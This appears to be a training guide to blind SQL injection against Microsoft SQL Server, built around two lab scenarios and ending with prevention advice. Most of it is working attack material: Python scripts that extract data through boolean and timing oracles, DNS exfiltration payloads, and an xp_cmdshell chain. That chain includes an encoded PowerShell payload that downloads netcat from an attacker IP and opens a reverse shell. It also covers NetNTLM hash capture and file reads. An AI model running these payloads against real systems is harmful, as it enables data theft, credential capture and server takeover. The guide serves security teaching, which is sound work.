# Blind SQL Injection - Comprehensive Guide

## Table of Contents
1. [Introduction to MSSQL/SQL Server](#introduction)
2. [Interacting with MSSQL](#interacting-with-mssql)
3. [Blind SQL Injection Types](#blind-sqli-types)
4. [Boolean-Based SQL Injection](#boolean-based)
5. [Time-Based SQL Injection](#time-based)
6. [Data Extraction Techniques](#data-extraction)
7. [Optimization Algorithms](#optimization)
8. [Out-of-Band (OOB) DNS Exfiltration](#oob-dns)
9. [Remote Code Execution](#rce)
10. [Leaking NetNTLM Hashes](#netntlm)
11. [File Read Operations](#file-read)
12. [Automation with SQLMap](#sqlmap)
13. [Prevention Techniques](#prevention)

---

## 1. Introduction to MSSQL/SQL Server {#introduction}

### Top 5 Relational Databases (Dec 2022)
1. Oracle
2. MySQL
3. Microsoft SQL Server (MSSQL)
4. PostgreSQL
5. IBM Db2

### What is Blind SQL Injection?
- **Non-Blind SQLi**: Results are directly visible in response
- **Blind SQLi**: No direct output; must infer results from page behavior

### Two Categories of Blind SQLi
1. **Boolean-based (Content-based)**: Observe differences in response (length, content)
2. **Time-based**: Use sleep commands and measure response time

---

## 2. Interacting with MSSQL {#interacting-with-mssql}

### A. SQLCMD (Windows Command Line)

**Connect to database:**
```powershell
sqlcmd -S 'SQL01' -U 'thomas' -P 'TopSecretPassword23!' -d bsqlintro -W
```

**Run queries:**
```sql
1> SELECT * FROM INFORMATION_SCHEMA.TABLES;
2> GO

1> SELECT TOP 5 users.firstName, users.lastName, posts.title
2> FROM users
3> JOIN posts
4> ON users.id=posts.authorId;
5> GO
```

### B. Impacket-MSSQLClient (Linux Command Line)

**Connect:**
```bash
impacket-mssqlclient thomas:'TopSecretPassword23!'@SQL01 -db bsqlintro
```

**Enable xp_cmdshell:**
```bash
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

### C. SQL Server Management Studio (Windows GUI)
- Visual interface for database management
- Connect → Browse databases → Run queries

---

## 3. Blind SQL Injection Types {#blind-sqli-types}

### Boolean-Based Example (PHP)
```php
$sql = "SELECT * FROM accounts WHERE email = '" . $_POST['email'] . "'";
$stmt = sqlsrv_query($conn, $sql);
$row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC);

if ($row === null) {
    echo "Email found";
} else {
    echo "Email not found";
}
```

**Vulnerability**: Responses differ based on query results (True/False)

---

## 4. Boolean-Based SQL Injection {#boolean-based}

### Scenario: Aunt Maria's Donuts
- Username availability check at `/api/check-username.php?u=<username>`
- Returns: `status: taken` or `status: available`

### Identifying the Vulnerability

**Test 1: Valid usernames**
```
/api/check-username.php?u=admin → status: taken
/api/check-username.php?u=maria → status: taken
```

**Test 2: Inject single quote**
```
/api/check-username.php?u=' → Error 500
```

**Test 3: Confirm SQLi**
```
/api/check-username.php?u=maria' or '1'='1 → status: taken
```

### Backend Query Structure
```sql
SELECT Username FROM Users WHERE Username = '<u>'
```

### Designing the Oracle

**Concept**: Use known username (`maria`) + AND condition
```sql
SELECT Username FROM Users WHERE Username = 'maria' AND <query>-- -'
```

**Testing:**
- `maria' AND 1=1-- -` → `status: taken` (TRUE)
- `maria' AND 1=0-- -` → `status: available` (FALSE)

### Python Oracle Implementation

```python
#!/usr/bin/python3
import requests
import json
import sys
from urllib.parse import quote_plus

target = "maria"

def oracle(q):
    p = quote_plus(f"{target}' AND ({q})-- -")
    r = requests.get(f"http://TARGET_IP/api/check-username.php?u={p}")
    j = json.loads(r.text)
    return j['status'] == 'taken'

# Verify oracle works
assert oracle("1=1")
assert not oracle("1=0")
```

### Data Extraction Steps

#### Step 1: Find Password Length
```python
length = 0
while not oracle(f"LEN(password)={length}"):
    length += 1
print(f"[*] Password length = {length}")
```

#### Step 2: Extract Characters (Brute Force Method)
```python
print("[*] Password = ", end='')
for i in range(1, length + 1):
    for c in range(32, 127):  # Printable ASCII
        if oracle(f"ASCII(SUBSTRING(password,{i},1))={c}"):
            print(chr(c), end='')
            sys.stdout.flush()
            break
print()
```

**Query explanation:**
- `SUBSTRING(password, N, 1)` - Get Nth character
- `ASCII(char)` - Convert to decimal value
- Test each ASCII value (32-126 for printable characters)

---

## 5. Time-Based SQL Injection {#time-based}

### Scenario: Digcraft Hosting
- No visible output/errors
- Injection point: `User-Agent` header

### MSSQL Time-Based Payload
```sql
';WAITFOR DELAY '0:0:10'--
```

**WAITFOR**: Blocks SQL query for specified duration

### Testing for Time-Based SQLi

**Test 1: Inject delay**
```http
User-Agent: ';WAITFOR DELAY '0:0:10'--
```
Result: 10-second delay confirms vulnerability

**Test 2: Verify it's our payload**
```http
User-Agent: ';WAITFOR DELAY '0:0:1'--
```
Result: 1-second delay

### Time-Based Payloads for Different Databases

| Database | Payload |
|----------|---------|
| MSSQL | `WAITFOR DELAY '0:0:10'` |
| MySQL/MariaDB | `AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%')` |
| PostgreSQL | `AND (SELECT pg_sleep(10))` |
| Oracle | `AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)` |

### Time-Based Oracle Design

**Concept**: IF-THEN logic with delay
```sql
IF (<query>) WAITFOR DELAY '0:0:5'
```

**Testing:**
- TRUE query (1=1) → Delay observed
- FALSE query (1=0) → No delay

### Python Implementation

```python
#!/usr/bin/python3
import requests
import time

DELAY = 1  # Adjust based on network conditions

def oracle(q):
    start = time.time()
    r = requests.get(
        "http://SERVER_IP:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY

# Verify oracle
assert oracle("1=1")
assert not oracle("1=0")
```

### Enumerating Database Information

#### 1. Get Database Name Length
```python
def dumpNumber(q):
    length = 0
    for p in range(7):  # 7 bits for ASCII (0-127)
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length

db_name_length = dumpNumber("LEN(DB_NAME())")
```

#### 2. Extract Database Name
```python
def dumpString(q, length):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val

db_name = dumpString("DB_NAME()", db_name_length)
```

#### 3. Count Tables
```sql
SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='digcraft'
```

#### 4. Get Table Names
```sql
-- Get length of Nth table name (offset N-1)
SELECT LEN(table_name) FROM information_schema.tables 
WHERE table_catalog='digcraft' 
ORDER BY table_name 
OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;

-- Get table name value
SELECT table_name FROM information_schema.tables 
WHERE table_catalog='digcraft' 
ORDER BY table_name 
OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;
```

#### 5. Get Column Names
```sql
-- Count columns
SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.columns 
WHERE table_name='flag' AND table_catalog='digcraft';

-- Get column name
SELECT column_name FROM INFORMATION_SCHEMA.columns 
WHERE table_name='flag' AND table_catalog='digcraft' 
ORDER BY column_name 
OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;
```

---

## 6. Data Extraction Techniques {#data-extraction}

### Complete Extraction Script Structure

```python
#!/usr/bin/python3
import requests
import time

DELAY = 1
TARGET_DB = "digcraft"
TARGET_TABLE = "flag"

def oracle(q):
    start = time.time()
    r = requests.get(
        "http://SERVER_IP:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY

def dumpNumber(q):
    length = 0
    for p in range(7):
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length

def dumpString(q, length):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val

# 1. Enumerate database
db_name_length = dumpNumber("LEN(DB_NAME())")
db_name = dumpString("DB_NAME()", db_name_length)
print(f"[+] Database: {db_name}")

# 2. Count tables
num_tables = dumpNumber(f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{TARGET_DB}'")
print(f"[+] Number of tables: {num_tables}")

# 3. Get table names
for i in range(num_tables):
    table_name_length = dumpNumber(f"SELECT LEN(table_name) FROM information_schema.tables WHERE table_catalog='{TARGET_DB}' ORDER BY table_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
    table_name = dumpString(f"SELECT table_name FROM information_schema.tables WHERE table_catalog='{TARGET_DB}' ORDER BY table_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", table_name_length)
    print(f"[+] Table {i+1}: {table_name}")

# 4. Get columns from target table
num_columns = dumpNumber(f"SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.columns WHERE table_name='{TARGET_TABLE}' AND table_catalog='{TARGET_DB}'")
print(f"[+] Columns in {TARGET_TABLE}: {num_columns}")

for i in range(num_columns):
    col_name_length = dumpNumber(f"SELECT LEN(column_name) FROM INFORMATION_SCHEMA.columns WHERE table_name='{TARGET_TABLE}' AND table_catalog='{TARGET_DB}' ORDER BY column_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
    col_name = dumpString(f"SELECT column_name FROM INFORMATION_SCHEMA.columns WHERE table_name='{TARGET_TABLE}' AND table_catalog='{TARGET_DB}' ORDER BY column_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", col_name_length)
    print(f"[+] Column {i+1}: {col_name}")

# 5. Extract data from flag table
num_rows = dumpNumber(f"SELECT COUNT(*) FROM {TARGET_TABLE}")
print(f"[+] Rows in {TARGET_TABLE}: {num_rows}")

for i in range(num_rows):
    flag_length = dumpNumber(f"SELECT LEN(flag) FROM {TARGET_TABLE} ORDER BY flag OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
    flag_value = dumpString(f"SELECT flag FROM {TARGET_TABLE} ORDER BY flag OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", flag_length)
    print(f"[+] Flag {i+1}: {flag_value}")
```

---

## 7. Optimization Algorithms {#optimization}

### Problem: Slow Extraction
- Brute force: 95 requests per character (printable ASCII)
- Example: 32-char password = 3,040 requests
- At 1 second per request = 50+ minutes

### Algorithm 1: Bisection (Binary Search)

**Concept**: Split search space in half repeatedly

**Example**: Finding character '-' (ASCII 45)
```
Search space: 0-127
Step 1: Is target between 0-63? YES → New range: 0-63
Step 2: Is target between 0-31? NO → New range: 32-63
Step 3: Is target between 32-47? YES → New range: 32-47
Step 4: Is target between 32-39? NO → New range: 40-47
Step 5: Is target between 40-43? NO → New range: 44-47
Step 6: Is target between 44-45? YES → New range: 44-45
Step 7: Is target between 44-44? NO → Target = 45
```

**Result**: 7 requests instead of 45!

**Python Implementation:**
```python
print("[*] Password = ", end='')
for i in range(1, length + 1):
    low = 0
    high = 127
    while low <= high:
        mid = (low + high) // 2
        if oracle(f"ASCII(SUBSTRING(password,{i},1)) BETWEEN {low} AND {mid}"):
            high = mid - 1
        else:
            low = mid + 1
    print(chr(low), end='')
    sys.stdout.flush()
print()
```

**Performance**: 7 requests per character

### Algorithm 2: SQL-Anding (Bitwise Operations)

**Concept**: Extract each bit of ASCII value

**ASCII in Binary**:
- Range: 0-127 (00000000 - 01111111)
- Only need 7 bits (MSB always 0)

**Example**: Finding '9' (ASCII 57 = 0111001)
```
Bit 0 (2^0=1):  57 & 1 > 0? YES → ...1
Bit 1 (2^1=2):  57 & 2 > 0? NO  → ..01
Bit 2 (2^2=4):  57 & 4 > 0? NO  → .001
Bit 3 (2^3=8):  57 & 8 > 0? YES → 1001
Bit 4 (2^4=16): 57 & 16 > 0? YES → 11001
Bit 5 (2^5=32): 57 & 32 > 0? YES → 111001
Bit 6 (2^6=64): 57 & 64 > 0? NO  → 0111001
Result: 0111001 = 57 = '9'
```

**Python Implementation:**
```python
print("[*] Password = ", end='')
for i in range(1, length + 1):
    c = 0
    for p in range(7):  # 7 bits
        if oracle(f"ASCII(SUBSTRING(password,{i},1))&{2**p}>0"):
            c |= 2**p  # Set bit
    print(chr(c), end='')
    sys.stdout.flush()
print()
```

**Performance**: 7 requests per character (slightly faster than bisection)

### Further Optimization: Multithreading

**Bisection**: Parallelize character extraction (not individual bit checks)
**SQL-Anding**: Fully parallelizable (all requests independent)

---

## 8. Out-of-Band (OOB) DNS Exfiltration {#oob-dns}

### When to Use OOB
- Time-based injections too slow/unreliable
- No visible output or timing differences
- Synchronous query execution

### Concept
1. Inject payload that triggers DNS request to your domain
2. Encode data as subdomain
3. Capture DNS logs to extract data

**Example**: Extract "secret" → DNS request to `736563726574.evil.com`

### MSSQL OOB Techniques

#### 1. master..xp_dirtree
```sql
DECLARE @T varchar(1024);
SELECT @T=(SELECT 1234);
EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\x"');
```

#### 2. master..xp_fileexist
```sql
DECLARE @T VARCHAR(1024);
SELECT @T=(SELECT 1234);
EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\x"');
```

#### 3. master..xp_subdirs
```sql
DECLARE @T VARCHAR(1024);
SELECT @T=(SELECT 1234);
EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\x"');
```

#### 4. sys.dm_os_file_exists
```sql
DECLARE @T VARCHAR(1024);
SELECT @T=(SELECT 1234);
SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');
```

#### 5. fn_trace_gettable
```sql
DECLARE @T VARCHAR(1024);
SELECT @T=(SELECT 1234);
SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);
```

#### 6. fn_get_audit_file
```sql
DECLARE @T VARCHAR(1024);
SELECT @T=(SELECT 1234);
SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);
```

### DNS Limitations
- **Characters**: Only letters and numbers
- **Label length**: Max 63 characters
- **Total length**: Max 253 characters

### Handling Long Data

**Encode and split into multiple subdomains:**
```sql
DECLARE @T VARCHAR(MAX); 
DECLARE @A VARCHAR(63); 
DECLARE @B VARCHAR(63);

-- Get data and convert to hex
SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) FROM flag;

-- Split into two parts
SELECT @A=SUBSTRING(@T,3,63);  -- Skip '0x' prefix
SELECT @B=SUBSTRING(@T,3+63,63);

-- Send DNS requests with both parts
SELECT * FROM fn_get_audit_file('\\'+@A+'.'+@B+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);
```

### Complete Exfiltration Payload

**Digcraft Hosting Example:**
```sql
';DECLARE @T VARCHAR(MAX);
DECLARE @A VARCHAR(63);
DECLARE @B VARCHAR(63);
SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) FROM flag;
SELECT @A=SUBSTRING(@T,3,63);
SELECT @B=SUBSTRING(@T,3+63,63);
EXEC('master..xp_subdirs "\\'+@A+'.'+@B+'.YOUR_DOMAIN\x"');--
```

### Tools for Capturing DNS Requests

#### A. Interact.sh (Free, Browser-based)

**Website**: https://app.interactsh.com

**Steps**:
1. Visit website
2. Copy generated domain (e.g., `cegs9f52vtc0000z2jt0g8ecwzwyyyyyb.oast.fun`)
3. Use in payload
4. Check for incoming DNS requests
5. Decode hex subdomain

**CLI Version:**
```bash
./interactsh-client
# Returns domain like: cegpcd2um5n3opvt0u30yep71yuz9as8k.oast.online
```

#### B. Burp Collaborator (Paid, Professional Only)

**Steps**:
1. Open Burp Suite Professional
2. Burp → Burp Collaborator Client
3. Copy generated domain
4. Use in payload (note: can't use @[email protected], need separate requests)
5. Poll for interactions

#### C. Custom DNS Server

**Setup on Local Network:**
1. Access DNS server dashboard (port 5380)
2. Login (admin:admin)
3. Add Zone → Primary Zone
4. Create custom domain (e.g., `blindsqli.academy.htb`)
5. Add A record pointing to attacker IP
6. Monitor DNS logs for incoming requests

**Practical Example - Aunt Maria's Donuts:**

Step 1: Test payload
```sql
maria';DECLARE @T VARCHAR(1024); 
SELECT @T=(SELECT 1234); 
SELECT * FROM fn_trace_gettable('\\'+@T+'.blindsqli.academy.htb\x.trc',DEFAULT);--+-
```

Step 2: Extract password hash
```sql
maria';DECLARE @T VARCHAR(MAX); 
DECLARE @A VARCHAR(63); 
DECLARE @B VARCHAR(63); 
SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), password), 1) FROM users WHERE username='maria'; 
SELECT @A=SUBSTRING(@T,3,63); 
SELECT @B=SUBSTRING(@T,3+63,63); 
SELECT * FROM fn_trace_gettable('\\'+@A+'.'+@B+'.blindsqli.academy.htb\x.trc',DEFAULT);--+-
```

Step 3: Check DNS logs → Find encoded result

Step 4: Decode from hex
```bash
# Remove dots, decode from hex to ASCII
```

---

## 9. Remote Code Execution {#rce}

### Prerequisites
- SQL injection as `sa` user OR
- User with necessary permissions (sysadmin role)

### Step 1: Verify Permissions

**Check if running as sysadmin:**
```sql
IS_SRVROLEMEMBER('sysadmin');
```

**Payload (Boolean-based):**
```sql
maria' AND IS_SRVROLEMEMBER('sysadmin')=1;--
```

Result: `status: taken` = sysadmin privileges confirmed

### Step 2: Enable Advanced Options

```sql
EXEC sp_configure 'Show Advanced Options', '1';
RECONFIGURE;
```

**Payload:**
```sql
';exec sp_configure 'show advanced options','1';reconfigure;--
```

### Step 3: Enable xp_cmdshell

```sql
EXEC sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
```

**Payload:**
```sql
';exec sp_configure 'xp_cmdshell','1';reconfigure;--
```

### Step 4: Test RCE

**Ping test (4 packets):**
```sql
EXEC xp_cmdshell 'ping /n 4 ATTACKER_IP';
```

**Payload:**
```sql
';exec xp_cmdshell 'ping /n 4 192.168.43.164';--
```

**Verify with tcpdump:**
```bash
sudo tcpdump -i eth0 icmp
```

### Step 5: Reverse Shell

#### PowerShell Command
```powershell
(new-object net.webclient).downloadfile("http://ATTACKER_IP/nc.exe", "c:\windows\tasks\nc.exe");
c:\windows\tasks\nc.exe -nv ATTACKER_IP 9999 -e c:\windows\system32\cmd.exe;
```

#### Encode Payload to Base64 (UTF-16LE)

**Python one-liner:**
```bash
python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\tasks\nc.exe"); c:\windows\tasks\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
```

#### Execute Encoded Payload

**Command:**
```sql
exec xp_cmdshell 'powershell -exec bypass -enc <BASE64_PAYLOAD>'
```

**Complete payload:**
```sql
';exec xp_cmdshell 'powershell -exec bypass -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAMwAuADEANgA0AC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIAAtAG4AdgAgADEAOQAyAC4AMQA2ADgALgA0ADMALgAxADYANAAgADkAOQA5ADkAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA==';--
```

#### Setup Listeners

**Terminal 1 - HTTP Server (serve nc.exe):**
```bash
python3 -m http.server 80
```

**Terminal 2 - Netcat Listener:**
```bash
nc -nvlp 9999
```

#### Execute Payload
Send the SQL injection → Get reverse shell!

---

## 10. Leaking NetNTLM Hashes {#netntlm}

### Concept
- Database service accounts often have network share access
- Coerce SQL server to authenticate to fake SMB share
- Capture NetNTLM hash with Responder

### Step 1: Setup Responder

**Clone repository:**
```bash
git clone https://github.com/lgandx/Responder
cd Responder
```

**Verify SMB is ON** (edit Responder.conf if needed):
```conf
SMB = On
```

**Start Responder:**
```bash
sudo python3 Responder.py -I eth0
```

Verify output shows: `SMB server [ON]`

### Step 2: Trigger SMB Authentication

**MSSQL Query:**
```sql
EXEC master..xp_dirtree '\\ATTACKER_IP\myshare', 1, 1;
```

**Payload (Aunt Maria's Donuts):**
```sql
';EXEC master..xp_dirtree '\\192.168.43.164\myshare', 1, 1;--
```

### Step 3: Capture Hash

**Responder output:**
```
[SMB] NTLMv2-SSP Client : 192.168.43.156
[SMB] NTLMv2-SSP Username : SQL01\jason
[SMB] NTLMv2-SSP Hash : jason::SQL01:bd7f162c24a39a0f:94DF80C5ABBA<SNIP>
```

### Step 4: Crack Hash (Optional)

**Using Hashcat:**
```bash
hashcat -m 5600 'jason::SQL01:bd7f162c24a39a0f:94DF80C5ABB<SNIP>' /usr/share/wordlists/rockyou.txt
```

**Hash mode 5600** = NetNTLMv2

**Output:**
```
Hash.Mode........: 5600 (NetNTLMv2)
Status...........: Cracked
Time.Started.....: Wed Dec 14 08:29:13 2022
Recovered........: 1/1 (100.00%)
```

---

## 11. File Read Operations {#file-read}

### Requirements
- Permission: `ADMINISTER BULK OPERATIONS` or `ADMINISTER DATABASE BULK OPERATIONS`
- All users can use `OPENROWSET`, but BULK operations need special privileges

### Check Permissions

**Query:**
```sql
SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') 
WHERE permission_name = 'ADMINISTER BULK OPERATIONS' 
OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';
```

**Payload:**
```sql
maria' AND (SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS')>0;--
```

Result: `status: taken` = Have permissions

### Read File Syntax

**Get file length:**
```sql
SELECT LEN(BulkColumn) FROM OPENROWSET(BULK 'C:\path\to\file.txt', SINGLE_CLOB) AS x
```

**Get file contents:**
```sql
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\path\to\file.txt', SINGLE_CLOB) AS x
```

**Options:**
- `SINGLE_CLOB` → varchar (text)
- `SINGLE_BLOB` → varbinary (binary)
- `SINGLE_NCLOB` → nvarchar (unicode text)

### Python Script for File Extraction

```python
#!/usr/bin/python3
import requests
import json
import sys
from urllib.parse import quote_plus

target = "maria"
file_path = 'C:\\Windows\\System32\\flag.txt'

def oracle(q):
    p = quote_plus(f"{target}' AND ({q})-- -")
    r = requests.get(f"http://TARGET_IP/api/check-username.php?u={p}")
    j = json.loads(r.text)
    return j['status'] == 'taken'

# Get file length
length = 1
while not oracle(f"(SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x)={length}"):
length += 1
print(f"[*] File length = {length}")

# Dump file contents using bisection
print("[*] File = ", end='')
for i in range(1, length + 1):
    low = 0
    high = 127
    while low <= high:
        mid = (low + high) // 2
        if oracle(f"(SELECT ASCII(SUBSTRING(BulkColumn,{i},1)) FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x) BETWEEN {low} AND {mid}"):
            high = mid - 1
        else:
            low = mid + 1
    print(chr(low), end='')
    sys.stdout.flush()
print()
```

---

## 12. Automation with SQLMap {#sqlmap}

### Installation

**Pre-installed on**: Kali Linux, ParrotOS

**Manual installation:**
1. Download from GitHub releases
2. Unzip archive
3. Run: `python3 sqlmap.py`

### Basic Usage

#### Detect SQLi
```bash
python sqlmap.py -u "http://TARGET_IP/api/check-username.php?u=maria" -batch
```

**Output:**
```
Parameter: u (GET)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: u=maria' AND 8717=8717 AND 'tkQZ'='tkQZ
```

#### Enumerate Databases
```bash
python sqlmap.py -u "http://TARGET_IP/api/check-username.php?u=maria" -batch --dbs
```

**Output:**
```
available databases [5]:
[*] amdonuts
[*] master
[*] model
[*] msdb
[*] tempdb
```

#### Enumerate Tables
```bash
python sqlmap.py -u "http://TARGET_IP/api/check-username.php?u=maria" -batch -D amdonuts --tables
```

**Output:**
```
Database: amdonuts
[1 table]
+-------+
| users |
+-------+
```

#### Dump Table
```bash
python sqlmap.py -u "http://TARGET_IP/api/check-username.php?u=maria" -D amdonuts -T users --dump
```

**Output:**
```
Database: amdonuts
Table: users
[3 entries]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| <hash>                           | maria    |
| <hash>                           | admin    |
| <hash>                           | bmdyy    |
+----------------------------------+----------+
```

### Advanced Options

**Faster data retrieval:**
```bash
--threads=10
```

**Test specific parameters:**
```bash
-p "parameter_name"
```

**Test headers:**
```bash
--headers="User-Agent: test"
```

**Custom injection point:**
```bash
-u "http://TARGET_IP/page?id=1*"
```

**Risk/Level:**
```bash
--risk=3 --level=5
```

---

## 13. Prevention Techniques {#prevention}

### 1. Input Validation & Sanitization

**Always treat user input as dangerous!**

**Bad Practice:**
```php
$sql = "SELECT email FROM accounts WHERE username = '" . $_POST['username'] . "'";
```

**Good Practice:**
```php
// Validate format
if (!filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
    die("Invalid email format");
}

// Sanitize
$username = htmlspecialchars($_POST['username']);
```

### 2. Parameterized Queries (Prepared Statements)

**Vulnerable Code:**
```php
$sql = "SELECT email FROM accounts WHERE username = '" . $_POST['username'] . "'";
$stmt = sqlsrv_query($conn, $sql);
```

**Secure Code:**
```php
$sql = "SELECT email FROM accounts WHERE username = ?";
$stmt = sqlsrv_query($conn, $sql, array($_POST['username']));
```

**Benefits:**
- Query structure and data separated
- Database treats user input as data only, not executable code

### 3. MSSQL-Specific Precautions

#### A. Don't Run as Sysadmin!

**Principle of Least Privilege:**
- Use dedicated service account
- Grant minimal necessary permissions
- Avoid `sa` account for application queries

**Built-in Database Roles (Least → Most Privileged):**
1. `public` (default)
2. `db_denydatareader`
3. `db_denydatawriter`
4. `db_datareader`
5. `db_datawriter`
6. `db_ddladmin`
7. `db_securityadmin`
8. `db_accessadmin`
9. `db_backupoperator`
10. `db_owner`

#### B. Disable Dangerous Functions

**Revoke execution on xp_dirtree:**
```sql
REVOKE EXECUTE ON xp_dirtree TO public;
```

**Revoke execution on xp_cmdshell:**
```sql
REVOKE EXECUTE ON xp_cmdshell TO public;
```

**Other dangerous functions:**
- `xp_fileexist`
- `xp_subdirs`
- `sp_OACreate`
- `sp_OAMethod`

### 4. Output Sanitization

**Even with input sanitization, sanitize output too!**

Prevents:
- Second-order SQL injection
- Stored XSS
- Other injection attacks

```php
echo htmlspecialchars($user_data, ENT_QUOTES, 'UTF-8');
```

### 5. Web Application Firewall (WAF)

**Common WAF Rules:**
- Block common SQL injection patterns
- Rate limiting
- Signature-based detection

**Note**: WAFs are NOT a replacement for secure coding!

### 6. Regular Security Audits

- Code reviews
- Penetration testing
- Automated scanning (SAST/DAST)
- Dependency updates

---

## Practice Scenarios Summary

### Scenario 1: Aunt Maria's Donuts (Boolean-based)
- **Vulnerable endpoint**: `/api/check-username.php?u=<username>`
- **Response**: `status: taken` or `status: available`
- **Target**: Extract maria's password
- **Database**: amdonuts
- **Table**: users
- **Columns**: username, password

### Scenario 2: Digcraft Hosting (Time-based)
- **Vulnerable header**: `User-Agent`
- **Technique**: `WAITFOR DELAY`
- **Target**: Extract flag
- **Database**: digcraft
- **Tables**: flag, userAgents
- **Alternative**: OOB DNS exfiltration

---

## Quick Reference Commands

### MSSQL Information Gathering
```sql
-- Current database
DB_NAME()

-- Database version
@@VERSION

-- Current user
USER_NAME()
SYSTEM_USER

-- Check if sysadmin
IS_SRVROLEMEMBER('sysadmin')

-- List databases
SELECT name FROM master.dbo.sysdatabases

-- List tables
SELECT * FROM INFORMATION_SCHEMA.TABLES

-- List columns
SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'

-- Count rows
SELECT COUNT(*) FROM table_name
```

### String Functions
```sql
-- Length
LEN(string)

-- Substring (1-indexed)
SUBSTRING(string, start, length)

-- ASCII value
ASCII(character)

-- Character from ASCII
CHAR(number)

-- Concatenation
string1 + string2
CONCAT(string1, string2)
```

### Useful Payloads
```sql
-- Boolean test
' AND 1=1-- -
' AND 1=0-- -

-- Time delay
'; WAITFOR DELAY '0:0:5'--

-- String comparison
' AND SUBSTRING(password,1,1)='a'--

-- Numeric comparison
' AND ASCII(SUBSTRING(password,1,1))=97--

-- Bitwise operation
' AND (ASCII(SUBSTRING(password,1,1))&1)>0--
```

---

## Troubleshooting Tips

### Boolean-based Issues
1. **Wrong username**: Use existing username (e.g., 'maria')
2. **Response inconsistency**: Server caching, use unique values
3. **URL encoding**: Ensure special characters are encoded

### Time-based Issues
1. **Network latency**: Increase DELAY value (3-5 seconds)
2. **False positives**: Run tests multiple times
3. **VPN slowness**: Account for additional latency

### OOB DNS Issues
1. **Firewall blocking**: Try different egress ports
2. **DNS not resolving**: Check DNS server configuration
3. **Data too long**: Split into multiple requests
4. **Encoding errors**: Use hex/base64 encoding

---

## Additional Resources

- **SQLMap Documentation**: https://github.com/sqlmapproject/sqlmap/wiki
- **OWASP SQL Injection**: https://owasp.org/www-community/attacks/SQL_Injection
- **PortSwigger SQL Injection**: https://portswigger.net/web-security/sql-injection
- **HackTricks SQL Injection**: https://book.hacktricks.xyz/pentesting-web/sql-injection

---

**Note**: This guide is for educational and authorized penetration testing purposes only. Always obtain written permission before testing any system you don't own.